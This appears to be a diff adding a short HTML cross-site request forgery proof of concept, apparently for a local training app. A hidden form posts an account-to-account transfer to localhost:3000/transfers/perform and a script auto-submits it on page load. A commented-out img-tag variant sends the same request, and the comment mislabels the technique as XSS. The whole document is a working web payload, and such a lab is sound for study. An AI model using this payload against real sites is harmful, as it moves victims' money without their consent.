@@ -1,0 +1,19 @@
+  <form id="tosubmit" method='post'
+        action="http://localhost:3000/transfers/perform">
+    
+    <input type="hidden"
+       name="accountFrom" value="1">
+
+    <input type="hidden"
+       name="accountTo" value="2">
+    
+    <input type="hidden"
+       name="amount" value="1">
+  </form>
+
+  <script>
+    document.getElementById('tosubmit').submit();
+  </script>
+  
+<!--     This is a XSS
+      <img src='http://localhost:3000/transfers/perform?accountFrom=1&accountTo=2&amount=1' -->
